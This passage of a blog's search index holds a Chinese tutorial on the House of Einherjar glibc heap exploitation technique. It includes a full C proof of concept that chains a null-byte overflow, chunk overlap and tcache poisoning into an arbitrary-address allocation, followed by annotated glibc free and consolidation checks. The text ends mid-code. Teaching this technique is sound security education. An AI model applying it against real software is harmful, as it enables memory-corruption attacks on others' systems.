<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>house_of_einherjar攻击</title>
    <link href="/2025/09/10/house-of-einherjar%E6%94%BB%E5%87%BB/"/>
    <url>/2025/09/10/house-of-einherjar%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="house-of-einherjar攻击"><a href="#house-of-einherjar攻击" class="headerlink" title="house_of_einherjar攻击"></a>house_of_einherjar攻击</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><code>house of einherjar</code> 是一种堆利用技术，由 <code>Hiroki Matsukuma</code> 提出。该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 <code>chunk</code> 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 <code>chunk</code>），从而使得尽可能避免碎片化。</p><p>此外，需要注意的是，在一些特殊大小的堆块中，<code>off-by-one</code> 不仅可以修改下一个堆块的 <code>prev_size</code>，还可以修改下一个堆块的 <code>PREV_INUSE</code> 比特位。</p><h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><ul><li>可以修改下一个堆快的<code>prev_size</code>位和<code>PREV_INUSE</code> 比特位</li><li>可以分配大于等于<code>unsortedbin</code>的<code>chunk</code></li></ul><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>演示<code>poc</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 这个 House of Einherjar 的变种由 Huascar Tejeda - @htejeda 修改，</span><br><span class="hljs-comment"> * 在开启 tcache 的 glibc-2.32 下仍然可用。</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * House of Einherjar 技术利用了一个 “单字节溢出 null 字节” 的漏洞，</span><br><span class="hljs-comment"> * 来控制 malloc() 返回的指针。</span><br><span class="hljs-comment"> * 它还需要一个堆地址泄漏（heap leak）。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在填满 tcache 链表（绕过与 fake chunk 合并的限制）之后，</span><br><span class="hljs-comment"> * 我们针对 unsorted bin（而不是 small bin），</span><br><span class="hljs-comment"> * 通过在堆上伪造一个 fake chunk 来实现攻击。</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * 注意：对于正常的 bin，这个限制不允许我们创建比该 arena 从系统中申请的内存更大的 chunk：</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c </span><br><span class="hljs-comment"> */</span><br><br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;欢迎来到 House of Einherjar 2!\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;测试环境: Ubuntu 22.04 64bit (glibc-2.35).\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;该技术在你有一个 malloc 堆块的单字节溢出（并且能写入 0x00）时可用。\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;本示例通过制造 chunk 重叠来演示 House of Einherjar 攻击。\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接着我们会利用 tcache poisoning 劫持控制流。\n&quot;</span><br>       <span class="hljs-string">&quot;由于补丁 https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41,\n&quot;</span><br>       <span class="hljs-string">&quot;tcache poisoning 现在需要堆地址泄漏。\n&quot;</span>);<br><br><span class="hljs-comment">// 准备目标地址</span><br><span class="hljs-comment">// 由于 https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=a1a486d70ebcc47a686ff5846875eacad0940e41</span><br><span class="hljs-comment">// 目标地址必须正确对齐</span><br><span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">0x10</span>];<br><span class="hljs-type">intptr_t</span> *target = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">// 选择一个正确对齐的目标地址</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++) &#123;<br><span class="hljs-keyword">if</span>(((<span class="hljs-type">long</span>)&amp;stack_var[i] &amp; <span class="hljs-number">0xf</span>) == <span class="hljs-number">0</span>) &#123;<br>target = &amp;stack_var[i];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>assert(target != <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n我们希望 malloc() 返回的地址是 %p.\n&quot;</span>, (<span class="hljs-type">char</span> *)target);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n申请一个 0x38 字节的堆块 &#x27;a&#x27;，用它来伪造一个 fake chunk。\n&quot;</span>);<br><span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br><span class="hljs-comment">// 伪造一个 fake chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n我们在目标 chunk 之前伪造一个 fake chunk，并且需要知道它的地址。\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;为了通过 unlink 检查，我们设置 fwd 和 bck 指针指向自己。\n&quot;</span>);<br><br>a[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">// prev_size (没用)</span><br>a[<span class="hljs-number">1</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// size</span><br>a[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// fwd</span><br>a[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// bck</span><br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;我们的 fake chunk 在 %p，看起来如下:\n&quot;</span>, a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;prev_size (未使用): %#lx\n&quot;</span>, a[<span class="hljs-number">0</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: %#lx\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="hljs-number">2</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;bck: %#lx\n&quot;</span>, a[<span class="hljs-number">3</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n再申请一个 0x28 字节的堆块 &#x27;b&#x27;。\n&quot;</span><br>       <span class="hljs-string">&quot;稍后会通过溢出 &#x27;b&#x27; 的一个字节，修改 &#x27;c&#x27; 的元数据。\n&quot;</span><br>       <span class="hljs-string">&quot;等 &#x27;b&#x27; 重叠后释放，就能用来发起 tcache poisoning。\n&quot;</span>);<br><span class="hljs-type">uint8_t</span> *b = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br><span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;因为我们要溢出 b，所以要知道它的真实大小（对齐后的大小）：%#x\n&quot;</span>, real_b_size);<br><br><span class="hljs-comment">/* 最好让 chunk 的 size 字段最低字节为 0x00。</span><br><span class="hljs-comment"> * 因为 chunk 大小包含了用户申请的大小 + 元数据对齐，</span><br><span class="hljs-comment"> * 所以选 0xf8 这种大小，得到的 size 字段最低字节正好为 0x00。 */</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n申请一个 0xf8 字节的堆块 &#x27;c&#x27;。\n&quot;</span>);<br><span class="hljs-type">uint8_t</span> *c = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br><span class="hljs-type">uint64_t</span>* c_size_ptr = (<span class="hljs-type">uint64_t</span>*)(c - <span class="hljs-number">8</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.size 实际是 (0x100) | prev_inuse = 0x101\n&quot;</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;我们通过溢出 &#x27;b&#x27; 的一个字节，把 &#x27;c&#x27; 的 size 改掉（写 0x00）。\n&quot;</span>);<br><span class="hljs-comment">// 漏洞点</span><br>b[real_b_size] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;修改后的 c.size: %#lx\n&quot;</span>, *c_size_ptr);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;最好让 b 的大小是 0x100 的倍数，这样只会改 prev_inuse 位，不会改 b 的大小。\n&quot;</span>);<br><br><span class="hljs-comment">// 在 b 结尾写入一个 fake prev_size</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n在 &#x27;b&#x27; 的最后 %lu 字节写入一个假的 prev_size，&quot;</span><br>       <span class="hljs-string">&quot;这样它会与我们的 fake chunk 合并。\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br><span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((c - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*) a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake prev_size = %p - %p = %#lx\n&quot;</span>, c - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>, a, fake_size);<br>*(<span class="hljs-type">size_t</span>*) &amp;b[real_b_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br><span class="hljs-comment">// 修改 fake chunk 的 size，与 c 的新 prev_size 一致</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n确保 fake chunk 的 size 与 c 的新 prev_size 一样。\n&quot;</span>);<br>a[<span class="hljs-number">1</span>] = fake_size;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在 fake chunk 的大小为 %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br><br><span class="hljs-comment">// 先填满 tcache，再 free 掉 c 让它合并 fake chunk</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n填满 tcache。\n&quot;</span>);<br><span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;释放这些 chunk，填满 tcache 列表。\n&quot;</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br><span class="hljs-built_in">free</span>(x[i]);<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在释放 &#x27;c&#x27;，它会和 fake chunk 合并，因为 c 的 prev_inuse 已经被清掉。\n&quot;</span>);<br><span class="hljs-built_in">free</span>(c);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake chunk 的大小变为 %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="hljs-number">1</span>]);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n现在再 malloc()，它会返回 fake chunk。\n&quot;</span>);<br><span class="hljs-type">intptr_t</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x158</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x158) 返回 %p\n&quot;</span>, d);<br><br><span class="hljs-comment">// tcache poisoning</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;补丁 https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f\n&quot;</span><br>       <span class="hljs-string">&quot;要求我们多申请/释放一个填充 chunk 来绕过 fd 校验。\n&quot;</span>);<br><span class="hljs-type">uint8_t</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br><span class="hljs-built_in">free</span>(pad);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n现在释放 &#x27;b&#x27;，准备做 tcache poisoning。\n&quot;</span>);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;tcache 链表现在是 [ %p -&gt; %p ].\n&quot;</span>, b, pad);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;我们通过 &#x27;d&#x27; 覆盖 b 的 fwd 指针。\n&quot;</span>);<br><span class="hljs-comment">// 注意：需要堆地址泄漏才能算出 d 的地址</span><br><span class="hljs-comment">// 但 House of Einherjar 本身也要求堆泄漏，所以可以直接用。</span><br>d[<span class="hljs-number">0x30</span> / <span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>)target ^ ((<span class="hljs-type">long</span>)&amp;d[<span class="hljs-number">0x30</span>/<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">12</span>);<br><br><span class="hljs-comment">// 取出 target</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在我们可以申请到 target 地址。\n&quot;</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br><span class="hljs-type">intptr_t</span> *e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n新分配的 chunk 在 %p\n&quot;</span>, e);<br><br><span class="hljs-comment">// 验证</span><br>assert(e == target);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;成功控制了 target（栈地址）！\n\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>堆空间申请，申请了三个利用堆块，<code>chunk1</code>进行了伪造，把<code>fd</code>和<code>bk</code>制作伪造为自身。利用<code>chunk2</code>进行溢出伪造<code>chunk3</code>的<code>prev_size</code></p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910135914376.png" alt="image-20250910135907246"></p><p>然后把<code>tcachebins</code>填满，去<code>free chunk3</code>，效果如下，堆块进行了合并，造成了堆块重叠</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910140335588.png" alt="image-20250910140335503"></p><p>接下来申请<code>unsortedbin</code>大小的空间，申请<code>chunk2</code>大小的空间，释放<code>chunk2</code>大小的两个堆块，后放入<code>chunk2</code>，为了绕过<code>fd</code>检查。然后通过申请到的<code>unsortedbin</code>进行修改<code>chunk2</code>的<code>fd</code>指针，可以进行任意地址申请</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910145711777.png" alt="image-20250910145711705"></p><h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><h3 id="free合法性校验"><a href="#free合法性校验" class="headerlink" title="free合法性校验"></a>free合法性校验</h3><p>当去free一个堆块的时候，调用<code>glibc/malloc/malloc.c</code>中的<code>_int_free</code>函数，该函数前面会进行校验判断，优先考虑放入<code>tcachebins</code>，如果<code>tcachebins</code>满了，且大小符合<code>fashbin</code>，会考虑放入<code>fashbin</code>，最后是放入<code>unsortedbin</code>。此攻击手法主要分析放入<code>unsortedbin</code>的分支。</p><p>当进入<code>unsortedbin</code>分支的时候，首先经过下面的一些校验，通过校验才会成功释放</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 判断要释放的块 p 是否就是 arena 的顶块（top chunk）。</span><br><span class="hljs-comment">   用户不可能拿到 top chunk 的指针来 free；出现即视为 double free/堆损坏。 */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top))<br>  malloc_printerr (<span class="hljs-string">&quot;double free or corruption (top)&quot;</span>);<br><br><span class="hljs-comment">/* 检查 nextchunk 是否越界到 arena 之外（仅在“连续堆”模式下）。</span><br><span class="hljs-comment">   对于 contiguous(av) 的 arena，(char*)nextchunk 不能超过</span><br><span class="hljs-comment">   av-&gt;top 的末尾地址 (char*)av-&gt;top + chunksize(av-&gt;top)。 */</span><br><span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av)<br>                      &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk<br>                         &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize (av-&gt;top)), <span class="hljs-number">0</span>))<br>  malloc_printerr (<span class="hljs-string">&quot;double free or corruption (out)&quot;</span>);<br><br><span class="hljs-comment">/* 检查 nextchunk 头部里的 prev_inuse 位。</span><br><span class="hljs-comment">   正常在我们调用 free(p) 之前，p 是“已使用”的，因此 nextchunk-&gt;prev_inuse 应为 1。</span><br><span class="hljs-comment">   若为 0，说明前块被标记为空闲（可能是 double free 或标志被篡改）。 */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse (nextchunk)))<br>  malloc_printerr (<span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>);<br><br><span class="hljs-comment">/* 取下一个物理块的“真实大小”（屏蔽低位标志位后的尺寸）。 */</span><br>nextsize = chunksize (nextchunk);<br><br><span class="hljs-comment">/* 下一个块的大小合法性检查：</span><br><span class="hljs-comment">   1) 不屏蔽标志位的原始 size（chunksize_nomask）小于等于块头大小（CHUNK_HDR_SZ）→ 太小，装不下头部，判坏；</span><br><span class="hljs-comment">   2) 屏蔽后的真实大小（nextsize）若大于等于该 arena 向系统申请的总内存（av-&gt;system_mem）→ 过大，判坏。 */</span><br><span class="hljs-keyword">if</span> (__builtin_expect (chunksize_nomask (nextchunk) &lt;= CHUNK_HDR_SZ, <span class="hljs-number">0</span>)<br>    || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>  malloc_printerr (<span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>);<br><span class="hljs-comment">/* 通过检查后进行释放 */</span><br>free_perturb (chunk2mem(p), size - CHUNK_HDR_SZ);<br><br></code></pre></td></tr></table></figure><h3 id="向前合并校验"><a href="#向前合并校验" class="headerlink" title="向前合并校验"></a>向前合并校验</h3><p>经过合法性检查之后下面进行<code>unlink</code>条件判断，首先进行向前合并检查。</p><ul><li>根据<code>prev_inuse</code>判断，如果<code>prev_inuse</code>为<code>0</code>说明上一个<code>chunk</code>未在使用，通过<code>prevsize</code>更新指针，如果伪造<code>prevsize</code>大小就会造成指针指向我们伪造的地址，经过检查之后，进行向前合并操作，造成堆块重叠。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* 若当前块 p 的“前块在用”标志为 0（说明前一个物理块是空闲的），</span><br><span class="hljs-comment">   则需要与前块进行向前合并（backward coalescing）。*/</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>  <span class="hljs-comment">/* 从当前块头部读取记录的前块大小（prev_size 字段）。*/</span><br>  prevsize = prev_size (p);<br>  <span class="hljs-comment">/* 合并大小：当前块 size 加上前块 size。*/</span><br>  size += prevsize;<br>  <span class="hljs-comment">/* 指针回退 prevsize 个字节，定位到“前一个物理块”的块头地址。*/</span><br>  p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>  <span class="hljs-comment">/* 一致性检查：前块头里的 size 必须与我们读取到的 prevsize 匹配，</span><br><span class="hljs-comment">     否则认为堆元数据被破坏（常见于越界/伪造 size）。*/</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>    malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>  <span class="hljs-comment">/* 将这个“前块”（此时是空闲块）从其所在 bin 的双向链表中摘除（unlink），</span><br><span class="hljs-comment">     为后续把两块合并成更大的空闲块做准备。</span><br><span class="hljs-comment">     这里会触发安全 unlink 检查（FD/BK 指针一致性等）。*/</span><br>  unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure><p>原理图如下</p><p>伪造蓝色堆块和绿色堆块的<code>prevsize</code>，然后<code>free</code>绿色堆块</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture@master/test/20250910183124931.png" alt="image-20250910183124817"></p><h3 id="向后合并校验"><a href="#向后合并校验" class="headerlink" title="向后合并校验"></a>向后合并校验</h3><p>如果不符合向前合并条件，就接着检查向后合并</p><ul><li>如果下一个<code>nextchunk</code>不是<code>topchunk</code>，进入分支判断下一个<code>chunk</code>的是否在使用，如果空闲进行合并，非空闲仅把<code>p_inuse</code>位置0</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;                     <span class="hljs-comment">// 如果后继物理块不是 top chunk，进入常规处理</span><br><br>  <span class="hljs-comment">/* 读取 nextchunk 的“inuse”状态。</span><br><span class="hljs-comment">     注意：一个块是否在用，是通过“其后一个块头部的 prev_inuse 位”来判断的。</span><br><span class="hljs-comment">     inuse_bit_at_offset(q, sz) ≈ 查看 chunk_at_offset(q, sz) 的 prev_inuse。</span><br><span class="hljs-comment">     这里传入 (nextchunk, nextsize)，即检查“nextchunk 的后一个块”记录的 prev_inuse，</span><br><span class="hljs-comment">     从而得知 nextchunk 本身是否在用。*/</span><br>  nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>  <span class="hljs-comment">/* 若 nextchunk 也是空闲的，执行向前合并（forward coalescing）：</span><br><span class="hljs-comment">     先把 nextchunk 从其所在 bin 的双向链表中摘除（unlink），</span><br><span class="hljs-comment">     再把它的大小并入当前块的 size。*/</span><br>  <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>    unlink_chunk (av, nextchunk);<br>    size += nextsize;<br>  &#125; <span class="hljs-keyword">else</span><br>    <span class="hljs-comment">/* 否则（nextchunk 在用），不能合并。</span><br><span class="hljs-comment">       仅需把 nextchunk 头部里的 prev_inuse 清零，表示“当前块 p 已经空闲”，</span><br><span class="hljs-comment">       以便将来当 nextchunk 被 free 时，可以与 p 合并。*/</span><br>    clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="unlink-chunk合法性校验"><a href="#unlink-chunk合法性校验" class="headerlink" title="unlink_chunk合法性校验"></a>unlink_chunk合法性校验</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 